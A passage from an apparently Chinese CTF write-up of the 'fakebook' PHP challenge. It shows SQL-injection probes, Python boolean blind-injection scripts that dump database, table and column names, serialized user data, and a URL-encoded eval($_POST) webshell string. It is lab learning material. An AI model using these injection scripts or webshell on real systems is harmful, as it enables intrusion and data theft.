class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment"># 这是一个用于发送 GET 请求并获取响应数据的 PHP 函数</span></span><br><span class="line">        <span class="comment"># 生成cURL句柄</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置要访问的URL为传入的$url</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="comment"># 将返回的结果作为字符串而不是直接输出到屏幕。</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 请求指定的URL并且讲响应保存</span></span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="comment"># 取出响应的状态码</span></span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 结束句柄</span></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="comment"># 返回扫描结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment"># 访问博客并且返回状态码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment"># 对博客内容近乎全部符号的过滤</span></span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="comment">#过滤传入的博客地址是否为http的格式</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个php类能做什么？</p>
<p>很显然，这是反序列化用的。但具体运用在哪里还犹未可知。</p>
<h3 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h3><p>随便注册个信息后，主页面的显示是这样子的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;table <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span>&quot;&gt;</span></span><br><span class="line"><span class="class">   &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">th</span>&gt;#&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">th</span>&gt;<span class="title">username</span>&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">th</span>&gt;<span class="title">age</span>&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">th</span>&gt;<span class="title">blog</span>&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">td</span>&gt;1&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">td</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&#x27;<span class="title">view</span>.<span class="title">php</span>?<span class="title">no</span>=1&#x27;&gt;<span class="title">admin1</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">td</span>&gt;21&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">         <span class="title">https</span>://<span class="title">cn</span>.<span class="title">bing</span>.<span class="title">com</span>/<span class="title">search</span>?<span class="title">q</span>=%3<span class="title">C</span>%3<span class="title">F</span>%3<span class="title">Deval</span>%28%24<span class="title">_POST</span>%5<span class="title">B1</span>%5<span class="title">D</span>%29%3<span class="title">F</span>%3<span class="title">E</span>&amp;<span class="title">qs</span>=<span class="title">n</span>&amp;<span class="title">form</span>=<span class="title">QBRE</span>&amp;<span class="title">sp</span>=-1&amp;<span class="title">lq</span>=0&amp;<span class="title">pq</span>=%3<span class="title">C</span>%3<span class="title">F</span>%3<span class="title">Deval</span>%28%24<span class="title">_post</span>%5<span class="title">B1</span>%5<span class="title">D</span>%29%3<span class="title">F</span>%3<span class="title">E</span>&amp;<span class="title">sc</span>=2-20&amp;<span class="title">sk</span>=&amp;<span class="title">cvid</span>=7482<span class="title">ABA7DD7A4EF8B63AE974123C279E</span>&amp;<span class="title">ghsh</span>=0&amp;<span class="title">ghacc</span>=0&amp;<span class="title">ghpl</span>=</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>view.php的no参数为1，说明可能存在SQL注入。</p>
<h3 id="脚本突破，布尔盲注"><a href="#脚本突破，布尔盲注" class="headerlink" title="脚本突破，布尔盲注"></a>脚本突破，布尔盲注</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">突破口<span class="number">1</span>：</span><br><span class="line">   用户的登录注册</span><br><span class="line">   在注册时写入敏感信息，一旦注册成功就能实现通过页面直接拿shell</span><br><span class="line">   </span><br><span class="line">   一番测试后这个方法失败了，而且是失败的很彻底。</span><br><span class="line">   测试结果：</span><br><span class="line">      第一是写入后门到用户名，根本无法直接拿shell。（表面插后门突破失败）</span><br><span class="line">      第二是尝试写后门到URL是根本不可能的，会被解析。（表面插后门突破失败）</span><br><span class="line">      第三，通过上面的类可以看到，age是会出现整数验证的。（表面插后门突破失败）</span><br><span class="line">      第四，admin用户都能直接注册了，注入点八成不在这里了。（表面插后门突破失败）</span><br><span class="line"></span><br><span class="line">突破口<span class="number">2</span>：</span><br><span class="line">   view.php的SQL注入</span><br><span class="line"></span><br><span class="line">   正常显示</span><br><span class="line">   view.php=(<span class="number">1</span>)=(<span class="number">1</span>)</span><br><span class="line">   报错</span><br><span class="line">   view.php=(<span class="number">1</span>)=(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一时间：脚本布尔盲注</span></span><br></pre></td></tr></table></figure>

<p>假设只能返回布尔值，那么：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 既然能返回布尔值，那就不能浪费了</span></span><br><span class="line"><span class="comment"># 用户名注册个admin和admin2加进去，跳转到view.php页面进行访问：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浏览器插件hackbar测试</span></span><br><span class="line"><span class="comment"># 1.测当前表列数</span></span><br><span class="line">?no=<span class="number">1</span> order by <span class="number">4</span></span><br><span class="line">=&gt;</span><br><span class="line">admin</span><br><span class="line"></span><br><span class="line">?no=<span class="number">1</span> order by <span class="number">5</span></span><br><span class="line">=&gt;</span><br><span class="line">报错</span><br><span class="line"><span class="comment">// 很显然，4列是当前表的极限</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库</span></span><br><span class="line"><span class="comment"># 测定当前数据库的长度</span></span><br><span class="line">?no=(<span class="keyword">if</span>((select%<span class="number">20</span>length(<span class="title function_ invoke__">database</span>())=<span class="number">8</span>),<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">=&gt;</span><br><span class="line">admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测报错</span></span><br><span class="line">?no=(select * <span class="keyword">from</span> flag)</span><br><span class="line">=&gt;</span><br><span class="line">[*] query error! (Table <span class="string">&#x27;fakebook.flag&#x27;</span> doesn<span class="string">&#x27;t exist)</span></span><br><span class="line"><span class="string">// 这难道是当前数据库库名？先抱着怀疑的心思使用脚本测试一下</span></span><br></pre></td></tr></table></figure>

<p>脚本测试database：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_database</span>(<span class="params">url</span>):</span><br><span class="line">   flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">   strings = <span class="string">&#x27;fabcdeghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_&#x27;</span></span><br><span class="line">   <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">         payload = <span class="string">&quot;(if((left(database(),&#123;&#125;)=&#x27;&#123;&#125;&#x27;),1,2))&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>, flag+i)</span><br><span class="line">         urls = url + <span class="string">&#x27;?no=&#x27;</span> + payload</span><br><span class="line">         res = requests.get(url=urls)</span><br><span class="line">         <span class="keyword">if</span> <span class="string">&#x27;admin2&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">               flag += i</span><br><span class="line">               <span class="built_in">print</span>(flag)</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">               <span class="keyword">continue</span></span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>测试结果如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fakEboOk</span><br><span class="line"><span class="comment">// 两者差别在于大小写，八成这个是错误的，上面那个小写才是对的。</span></span><br></pre></td></tr></table></figure>

<p>库爆出来了，接下来试着爆表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_tables</span>(<span class="params">url</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    strings = string.printable</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">            payload = <span class="string">&#x27;?no=(SUBSTR((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = DATABASE()), &#123;&#125;, 1) = CHAR(&#123;&#125;))&#x27;</span>.<span class="built_in">format</span>(num, <span class="built_in">ord</span>(i))</span><br><span class="line">            urls = url + payload</span><br><span class="line">            res = requests.get(url=urls)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin2&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> <span class="string">&#x27;Fatal error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                key = flag</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="keyword">if</span> key == flag:</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;table_name:&quot;</span> + flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>这里我只给出函数，调用的事情应该是人人都会的吧？</p>
<p>下面是脚本返回的结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">table_name:u</span><br><span class="line">table_name:us</span><br><span class="line">table_name:<span class="keyword">use</span></span><br><span class="line"><span class="title">table_name</span>:<span class="title">user</span></span><br><span class="line"><span class="title">table_name</span>:<span class="title">users</span></span><br></pre></td></tr></table></figure>

<p>下面试着爆列名，脚本改下之前的SQL语句就好了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_tables</span>(<span class="params">url</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    strings = string.printable</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">        <span class="comment"># print()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">            payload = <span class="string">&#x27;?no=(substr((select group_concat(column_name) from information_schema.columns where table_name=concat(char(117),char(115),char(101),char(114),char(115))),&#123;&#125;,1)=char(&#123;&#125;))&#x27;</span>.<span class="built_in">format</span>(num, <span class="built_in">ord</span>(i))</span><br><span class="line">            urls = url + payload</span><br><span class="line">            res = requests.get(url=urls)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin2&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> <span class="string">&#x27;Fatal error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                key = flag</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="keyword">if</span> key == flag:</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;head:&quot;</span> + flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>回显：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">head:no,username,passwd,data,user,current_connections,total_connections</span><br></pre></td></tr></table></figure>

<p>读出的用户名密码和no都是我们知晓的，那data是个什么东西？</p>
<p>试着扫出来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 涉及的SQL是：select group_concat(data) from fakebook.users</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:</span><br><span class="line">&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">21</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;http://www.baidu.com&quot;</span>;&#125;,</span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:</span><br><span class="line">&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;admin2&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">23</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;https://xiaodi8.com/&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="回显点重测"><a href="#回显点重测" class="headerlink" title="回显点重测"></a>回显点重测</h3><p>到这里就有三个解决问题的方向：</p>
<p>先补充一点：flag.php是能被扫描到的，但是当时碍于字典不全没扫出来。</p>
<blockquote>
<ol>
<li>插入数据：注册数据时把数据插入进去，得到flag文件</li>
<li>更新旧数据：更新注册完成的用户数据，把用户数据的内容换成新的内容，绕过正则表达式</li>
<li>虚拟数据：使用测试的回显点调用自己写的序列化内容来得到flag。</li>
</ol>
</blockquote>
<p>再补充一点：view.php是视图的意思，这个php下面还有一个非常特殊的区域：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">&#x27;100%&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;10em&#x27;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html;base64,PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPjxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSxjaHJvbWU9MSI+PG1ldGEgY29udGVudD0iYWx3YXlzIiBuYW1lPSJyZWZlcnJlciI+PG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IuWFqOeQg+mihuWFiOeahOS4reaWh+aQnOe0ouW8leaTjuOAgeiHtOWKm+S6juiuqee9keawkeabtOS+v+aNt+WcsOiOt+WPluS/oeaBr++8jOaJvuWIsOaJgOaxguOAgueZvuW6pui2hei/h+WNg+S6v+eahOS4reaWh+e9kemhteaVsOaNruW6k++8jOWPr+S7peeerOmXtOaJvuWIsOebuOWFs+eahOaQnOe0oue7k+aenOOAgiI+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSIvL3d3dy5iYWlkdS5jb20vZmF2aWNvbi5pY28iIHR5cGU9ImltYWdlL3gtaWNvbiI+PGxpbmsgcmVsPSJzZWFyY2giIHR5cGU9ImFwcGxpY2F0aW9uL29wZW5zZWFyY2hkZXNjcmlwdGlvbit4bWwiIGhyZWY9Ii8vd3d3LmJhaWR1LmNvbS9jb250ZW50LXNlYXJjaC54bWwiIHRpdGxlPSLnmb7luqbmkJzntKIiPjx0aXRsZT7nmb7luqbkuIDkuIvvvIzkvaDlsLHnn6XpgZM8L3RpdGxlPjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Ym9keXttYXJnaW46MDtwYWRkaW5nOjA7dGV4dC1hbGlnbjpjZW50ZXI7YmFja2dyb3VuZDojZmZmO2hlaWdodDoxMDAlfWh0bWx7b3ZlcmZsb3cteTphdXRvO2NvbG9yOiMwMDA7b3ZlcmZsb3c6LW1vei1zY3JvbGxiYXJzO2hlaWdodDoxMDAlfWJvZHksaW5wdXR7Zm9udC1zaXplOjEycHg7Zm9udC1mYW1pbHk6IlBpbmdGYW5nIFNDIixBcmlhbCwiTWljcm9zb2Z0IFlhSGVpIixzYW5zLXNlcmlmfWF7dGV4dC1kZWNvcmF0aW9uOm5vbmV9YTpob3Zlcnt0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lfWltZ3tib3JkZXI6MDstbXMtaW50ZXJwb2xhdGlvbi1tb2RlOmJpY3ViaWN9aW5wdXR7Zm9udC1zaXplOjEwMCU7Ym9yZGVyOjB9Ym9keSxmb3Jte3Bvc2l0aW9uOnJlbGF0aXZlO3otaW5kZXg6MH0jd3JhcHBlcntoZWlnaHQ6MTAwJX0jaGVhZF93cmFwcGVyLnMtcHMtaXNsaXRle3BhZGRpbmctYm90dG9tOjM3MHB4fSNoZWFkX3dyYXBwZXIucy1wcy1pc2xpdGUgLnNfZm9ybXtwb3NpdGlvbjpyZWxhdGl2ZTt6LWluZGV4OjF9I2hlYWRfd3JhcHBlci5zLXBzLWlzbGl0ZSAuZm17cG9zaXRpb246YWJzb2x1dGU7Ym90dG9tOjB9I2hlYWRfd3JhcHBlci5zLXBzLWlzbGl0ZSAucy1wLXRvcHtwb3NpdGlvbjphYnNvbHV0ZTtib3R0b206NDBweDt3aWR0aDoxMDAlO2hlaWdodDoxODFweH0jaGVhZF93cmFwcGVyLnMtcHMtaXNsaXRlICNzX2xnX2ltZ3twb3NpdGlvbjpzdGF0aWM7bWFyZ2luOjMzcHggYXV0byAwIGF1dG87bGVmdDo1MCV9I2Zvcm17ei1pbmRleDoxfS5zX2Zvcm1fd3JhcHBlcntoZWlnaHQ6MTAwJX0jbGh7bWFyZ2luOjE2cHggMCA1cHg7d29yZC1zcGFjaW5nOjNweH0uYy1mb250LW5vcm1hbHtmb250OjEzcHgvMjNweCBBcmlhbCxzYW5zLXNlcmlmfS5jLWNvbG9yLXR7Y29sb3I6IzIyMn0uYy1idG4sLmMtYnRuOnZpc2l0ZWR7Y29sb3I6IzMzMyFpbXBvcnRhbnR9LmMtYnRue2Rpc3BsYXk6aW5saW5lLWJsb2NrO292ZXJmbG93OmhpZGRlbjtmb250LWZhbWlseTppbmhlcml0O2ZvbnQtd2VpZ2h0OjQwMDt0ZXh0LWFsaWduOmNlbnRlcjt2ZXJ0aWNhbC1hbGlnbjptaWRkbGU7b3V0bGluZTowO2JvcmRlcjowO2hlaWdodDozMHB4O3dpZHRoOjgwcHg7bGluZS1oZWlnaHQ6MzBweDtmb250LXNpemU6MTNweDtib3JkZXItcmFkaXVzOjZweDtwYWRkaW5nOjA7YmFja2dyb3VuZC1jb2xvcjojZjVmNWY2O2N1cnNvcjpwb2ludGVyfS5jLWJ0bjpob3ZlcntiYWNrZ3JvdW5kLWNvbG9yOiMzMTVlZmI7Y29sb3I6I2ZmZiFpbXBvcnRhbnR9YS5jLWJ0bnt0ZXh0LWRlY29yYXRpb246bm9uZX0uYy1idG4tbWluaXtoZWlnaHQ6MjRweDt3aWR0aDo0OHB4O2xpbmUtaGVpZ2h0OjI0cHh9LmMtYnRuLXByaW1hcnksLmMtYnRuLXByaW1hcnk6dmlzaXRlZHtjb2xvcjojZmZmIWltcG9ydGFudH0uYy1idG4tcHJpbWFyeXtiYWNrZ3JvdW5kLWNvbG9yOiM0ZTZlZjJ9LmMtYnRuLXByaW1hcnk6aG92ZXJ7YmFja2dyb3VuZC1jb2xvcjojMzE1ZWZifWE6YWN0aXZle2NvbG9yOiNmNjB9I3dyYXBwZXJ7cG9zaXRpb246cmVsYXRpdmU7bWluLWhlaWdodDoxMDAlfSNoZWFke3BhZGRpbmctYm90dG9tOjEwMHB4O3RleHQtYWxpZ246Y2VudGVyfSN3cmFwcGVye21pbi13aWR0aDoxMjUwcHg7aGVpZ2h0OjEwMCU7bWluLWhlaWdodDo2MDBweH0jaGVhZHtwb3NpdGlvbjpyZWxhdGl2ZTtwYWRkaW5nLWJvdHRvbTowO2hlaWdodDoxMDAlO21pbi1oZWlnaHQ6NjAwcHh9LnNfZm9ybV93cmFwcGVye2hlaWdodDoxMDAlfS5xdWlja2RlbGV0ZS13cmFwe3Bvc2l0aW9uOnJlbGF0aXZlfS50b29sc3twb3NpdGlvbjphYnNvbHV0ZTtyaWdodDotNzVweH0ucy1pc2luZGV4LXdyYXB7cG9zaXRpb246cmVsYXRpdmV9I2hlYWRfd3JhcHBlci5oZWFkX3dyYXBwZXJ7d2lkdGg6YXV0b30jaGVhZF93cmFwcGVye3Bvc2l0aW9uOnJlbGF0aXZlO2hlaWdodDo0MCU7bWluLWhlaWdodDozMTRweDttYXgtaGVpZ2h0OjUxMHB4O3dpZHRoOjEwMDBweDttYXJnaW46MCBhdXRvfSNoZWFkX3dyYXBwZXIgLnMtcC10b3B7aGVpZ2h0OjYwJTttaW4taGVpZ2h0OjE4NXB4O21heC1oZWlnaHQ6MzEwcHg7cG9zaXRpb246cmVsYXRpdmU7ei1pbmRleDowO3RleHQtYWxpZ246Y2VudGVyfSNoZWFkX3dyYXBwZXIgaW5wdXR7b3V0bGluZTowOy13ZWJraXQtYXBwZWFyYW5jZTpub25lfSNoZWFkX3dyYXBwZXIgLnNfYnRuX3dyLCNoZWFkX3dyYXBwZXIgLnNfaXB0X3dye2Rpc3BsYXk6aW5saW5lLWJsb2NrO3pvb206MTtiYWNrZ3JvdW5kOjAgMDt2ZXJ0aWNhbC1hbGlnbjp0b3B9I2hlYWRfd3JhcHBlciAuc19pcHRfd3J7cG9zaXRpb246cmVsYXRpdmU7d2lkdGg6NTQ2cHh9I2hlYWRfd3JhcHBlciAuc19idG5fd3J7d2lkdGg6MTA4cHg7aGVpZ2h0OjQ0cHg7cG9zaXRpb246cmVsYXRpdmU7ei1pbmRleDoyfSNoZWFkX3dyYXBwZXIgLnNfaXB0X3dyOmhvdmVyICNrd3tib3JkZXItY29sb3I6I2E3YWFiNX0jaGVhZF93cmFwcGVyICNrd3t3aWR0aDo1MTJweDtoZWlnaHQ6MTZweDtwYWRkaW5nOjEycHggMTZweDtmb250LXNpemU6MTZweDttYXJnaW46MDt2ZXJ0aWNhbC1hbGlnbjp0b3A7b3V0bGluZTowO2JveC1zaGFkb3c6bm9uZTtib3JkZXItcmFkaXVzOjEwcHggMCAwIDEwcHg7Ym9yZGVyOjJweCBzb2xpZCAjYzRjN2NlO2JhY2tncm91bmQ6I2ZmZjtjb2xvcjojMjIyO292ZXJmbG93OmhpZGRlbjtib3gtc2l6aW5nOmNvbnRlbnQtYm94fSNoZWFkX3dyYXBwZXIgI2t3OmZvY3Vze2JvcmRlci1jb2xvcjojNGU2ZWYyIWltcG9ydGFudDtvcGFjaXR5OjF9I2hlYWRfd3JhcHBlciAuc19mb3Jte3dpZHRoOjY1NHB4O2hlaWdodDoxMDAlO21hcmdpbjowIGF1dG87dGV4dC1hbGlnbjpsZWZ0O3otaW5kZXg6MTAwfSNoZWFkX3dyYXBwZXIgLnNfYnRue2N1cnNvcjpwb2ludGVyO3dpZHRoOjEwOHB4O2hlaWdodDo0NHB4O2xpbmUtaGVpZ2h0OjQ1cHg7cGFkZGluZzowO2JhY2tncm91bmQ6MCAwO2JhY2tncm91bmQtY29sb3I6IzRlNmVmMjtib3JkZXItcmFkaXVzOjAgMTBweCAxMHB4IDA7Zm9udC1zaXplOjE3cHg7Y29sb3I6I2ZmZjtib3gtc2hhZG93Om5vbmU7Zm9udC13ZWlnaHQ6NDAwO2JvcmRlcjpub25lO291dGxpbmU6MH0jaGVhZF93cmFwcGVyIC5zX2J0bjpob3ZlcntiYWNrZ3JvdW5kLWNvbG9yOiM0NjYyZDl9I2hlYWRfd3JhcHBlciAuc19idG46YWN0aXZle2JhY2tncm91bmQtY29sb3I6IzQ2NjJkOX0jaGVhZF93cmFwcGVyIC5xdWlja2RlbGV0ZS13cmFwe3Bvc2l0aW9uOnJlbGF0aXZlfSNzX3RvcF93cmFwe3Bvc2l0aW9uOmFic29sdXRlO3otaW5kZXg6OTk7bWluLXdpZHRoOjEwMDBweDt3aWR0aDoxMDAlfS5zLXRvcC1sZWZ0e3Bvc2l0aW9uOmFic29sdXRlO2xlZnQ6MDt0b3A6MDt6LWluZGV4OjEwMDtoZWlnaHQ6NjBweDtwYWRkaW5nLWxlZnQ6MjRweH0ucy10b3AtbGVmdCAubW5hdnttYXJnaW4tcmlnaHQ6MzFweDttYXJnaW4tdG9wOjE5cHg7ZGlzcGxheTppbmxpbmUtYmxvY2s7cG9zaXRpb246cmVsYXRpdmV9LnMtdG9wLWxlZnQgLm1uYXY6aG92ZXIgLnMtYnJpLC5zLXRvcC1sZWZ0IGE6aG92ZXJ7Y29sb3I6IzMxNWVmYjt0ZXh0LWRlY29yYXRpb246bm9uZX0ucy10b3AtbGVmdCAucy10b3AtbW9yZS1idG57cGFkZGluZy1ib3R0b206MTlweH0ucy10b3AtbGVmdCAucy10b3AtbW9yZS1idG46aG92ZXIgLnMtdG9wLW1vcmV7ZGlzcGxheTpibG9ja30ucy10b3AtcmlnaHR7cG9zaXRpb246YWJzb2x1dGU7cmlnaHQ6MDt0b3A6MDt6LWluZGV4OjEwMDtoZWlnaHQ6NjBweDtwYWRkaW5nLXJpZ2h0OjI0cHh9LnMtdG9wLXJpZ2h0IC5zLXRvcC1yaWdodC10ZXh0e21hcmdpbi1sZWZ0OjMycHg7bWFyZ2luLXRvcDoxOXB4O2Rpc3BsYXk6aW5saW5lLWJsb2NrO3Bvc2l0aW9uOnJlbGF0aXZlO3ZlcnRpY2FsLWFsaWduOnRvcDtjdXJzb3I6cG9pbnRlcn0ucy10b3AtcmlnaHQgLnMtdG9wLXJpZ2h0LXRleHQ6aG92ZXJ7Y29sb3I6IzMxNWVmYn0ucy10b3AtcmlnaHQgLnMtdG9wLWxvZ2luLWJ0bntkaXNwbGF5OmlubGluZS1ibG9jazttYXJnaW4tdG9wOjE4cHg7bWFyZ2luLWxlZnQ6MzJweDtmb250LXNpemU6MTNweH0ucy10b3AtcmlnaHQgYTpob3Zlcnt0ZXh0LWRlY29yYXRpb246bm9uZX0jYm90dG9tX2xheWVye3dpZHRoOjEwMCU7cG9zaXRpb246Zml4ZWQ7ei1pbmRleDozMDI7Ym90dG9tOjA7bGVmdDowO2hlaWdodDozOXB4O3BhZGRpbmctdG9wOjFweDtvdmVyZmxvdzpoaWRkZW47em9vbToxO21hcmdpbjowO2xpbmUtaGVp